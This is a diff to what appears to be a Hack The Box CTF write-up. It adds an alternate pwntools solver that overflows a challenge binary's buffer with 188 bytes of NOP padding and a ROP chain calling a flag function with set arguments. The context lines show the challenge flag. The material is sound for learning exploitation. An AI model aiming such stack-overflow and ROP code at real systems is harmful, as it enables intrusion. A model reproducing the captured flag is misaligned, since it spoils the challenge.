@@ -154,3 +154,44 @@ sh.interactive()
 HTB{0ur_Buff3r_1s_not_healthy}
 ```
 
+## ALTERNATE SOLVER
+
+> using ropstar
+
+```py
+import os
+from pwn import *
+
+os.system('clear')
+
+def start(argv=[], *a, **kw):
+    if args.REMOTE:
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:
+        return process([exe] + argv, *a, **kw)
+
+exe = './vuln'
+elf = context.binary = ELF(exe, checksec=True)
+context.log_level = 'DEBUG'
+
+sh = start()
+
+padding = asm('nop') * 188 # EIP OFFSET
+
+rop = ROP(elf)
+
+rop.flag(0xdeadbeef, 0xc0ded00d)
+
+send = padding + rop.chain()
+
+sh.sendline(send)
+
+get = sh.recvall()
+print(get)
+
+print(rop.dump())
+
+sh.interactive()
+```
+
+
